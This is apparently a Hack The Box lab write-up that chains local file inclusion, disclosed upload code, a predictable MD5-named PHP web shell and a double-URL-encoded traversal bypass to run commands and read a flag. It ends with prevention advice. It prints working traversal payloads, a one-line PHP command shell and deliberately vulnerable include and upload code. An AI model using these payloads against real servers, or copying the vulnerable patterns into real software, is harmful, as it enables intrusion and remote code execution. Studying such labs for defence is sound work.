# HTB - Skills Assessment: File Inclusion

## Lab Overview

This lab combined multiple concepts together:

- Local File Inclusion (LFI)
- Directory traversal
- Source code disclosure
- File upload logic analysis
- Double URL encoding bypass
- Achieving Remote Code Execution (RCE)

What made this lab interesting was that the vulnerability was not immediately obvious.  
The upload functionality itself was not vulnerable directly, but chaining multiple findings together eventually led to RCE and flag access.

---

# Initial Enumeration

The application contained a file upload form using:

```http
multipart/form-data
```

Initially, the upload functionality did not appear vulnerable.

No direct file execution was possible after upload.

---

# Discovering Image Endpoint

Found an image-loading endpoint:

```text
http://154.57.164.81:30911/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c
```

The parameter:

```text
p=
```

looked suspicious because it referenced a file path or identifier.

---

# Testing for LFI

Modified the parameter:

```text
http://154.57.164.81:30911/api/image.php?p=....//....//....//....//...//etc/passwd
```

The application returned an image rendering error.

Important observation:

```text
Cannot display image
```

This strongly suggested the file inclusion worked, but the browser could not render `/etc/passwd` as an image.

---

# Why Burp Worked

Browsers try to interpret responses as images.

Non-image content appears broken.

Opened the request in Burp Suite and the file contents were visible successfully.

![image](https://github.com/user-attachments/assets/d2184df8-ffbe-4d9c-bbcd-759f6fee9313)

This confirmed Local File Inclusion.

---

# Identifying Server Technology

Further enumeration showed the server was using:

```text
nginx
```

Attempted log poisoning for RCE, but it did not work.

Possible reasons:

- Different log permissions
- PHP execution restrictions
- Nginx/PHP-FPM behavior differences

---

# Interesting Discovery - Source Code Disclosure

Noticed the vulnerable endpoint was inside:

```text
/api/
```

Started directory brute forcing around `/api`.

Discovered:

```text
/ api/application.php
```

This exposed backend source code.

---

# Source Code Analysis

```php
<?php
$firstName = $_POST["firstName"];
$lastName = $_POST["lastName"];
$email = $_POST["email"];
$notes = (isset($_POST["notes"])) ? $_POST["notes"] : null;

$tmp_name = $_FILES["file"]["tmp_name"];
$file_name = $_FILES["file"]["name"];
$ext = end((explode(".", $file_name)));

$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;

move_uploaded_file($tmp_name, $target_file);

header("Location: /thanks.php?n=" . urlencode($firstName));
?>
```

![image](https://github.com/user-attachments/assets/9b0cffee-b7c2-4590-aebb-f73c677d5f12)

---

# Important Finding

The upload filename was generated using:

```php
md5_file($tmp_name)
```

Meaning:

```text
uploaded file content → MD5 hash → stored filename
```

So if the attacker knows the uploaded file contents, they can predict the final filename.

---

# Creating Predictable Shell Name

Uploaded a PHP shell:

```php
<?php system($_GET['cmd']); ?>
```

Calculated its MD5 hash:

```bash
md5sum shell.php | cut -d ' ' -f1
```

Result:

```text
e88d9c921ac17e074964e2c22d780f03
```

So uploaded file became:

```text
e88d9c921ac17e074964e2c22d780f03.php
```

# Accessing Uploaded Shell Directly

Visited the uploaded file location.

![image](https://github.com/user-attachments/assets/a09e1f1c-5eea-454b-afd9-4e0f4caf1d75)

However, direct execution was still restricted.

Needed another inclusion point.

---

# Discovery of `contact.php`

Found another vulnerable file:

```php
<?php
$region = "AT";
$danger = false;

if (isset($_GET["region"])) {
    if (str_contains($_GET["region"], ".") || str_contains($_GET["region"], "/")) {
        echo "'region' parameter contains invalid character(s)";
        $danger = true;
    } else {
        $region = urldecode($_GET["region"]);
    }
}

if (!$danger) {
    include "./regions/" . $region . ".php";
}
?>
```

---

# Understanding the Filter Bypass

Developer attempted to block:

```text
.
/
```

But validation happened BEFORE:

```php
urldecode()
```

This created a classic double URL encoding bypass.

---

# Why Double Encoding Works

Input:

```text
%252E%252E%252F
```

First decode:

```text
%2E%2E%2F
```

Second decode:

```text
../
```

Because filtering occurred before decoding, traversal payload bypassed validation.

---

# Final Exploit

Payload:

```text
/contact.php?region=%252E%252E%252Fuploads%252Fe88d9c921ac17e074964e2c22d780f03&cmd=cat+/flag_09ebca.txt
```

Full request:

```text
http://154.57.164.78:31605/contact.php?region=%252E%252E%252Fuploads%252Fe88d9c921ac17e074964e2c22d780f03&cmd=cat+/flag_09ebca.txt
```

---

# What Happens Internally

Application flow:

```text
1. Double encoded payload bypasses filter
2. urldecode() converts payload into traversal sequence
3. include() loads uploaded PHP shell
4. PHP executes shell
5. cmd parameter executes system command
```

Result:

```bash
cat /flag_09ebca.txt
```

Successfully retrieved the flag.

# Attack Chain Summary

```text
LFI Discovery
      ↓
Source Code Disclosure
      ↓
Understand Upload Logic
      ↓
Predict Uploaded Filename
      ↓
Upload PHP Shell
      ↓
Find Second LFI Endpoint
      ↓
Double URL Encoding Bypass
      ↓
Include Uploaded Shell
      ↓
Remote Code Execution
```

---

# Key Learnings

- LFI vulnerabilities can become RCE through chaining
- Browsers may hide successful file reads if content is not renderable
- Source code disclosure is extremely valuable
- File upload naming logic can become predictable
- Validation before decoding is dangerous
- Double URL encoding bypasses weak filters
- Small vulnerabilities combined together become critical

---

# Security Impact

This attack chain may lead to:

- Remote Code Execution
- Full application compromise
- Arbitrary file inclusion
- Sensitive file disclosure
- Web shell deployment

---

# Prevention

- Never use user input directly inside:
  
```php
include()
require()
```

- Validate AFTER decoding input
- Use strict allowlists
- Prevent execution inside upload directories
- Randomize uploaded filenames securely
- Disable PHP execution in uploads
- Sanitize traversal sequences properly
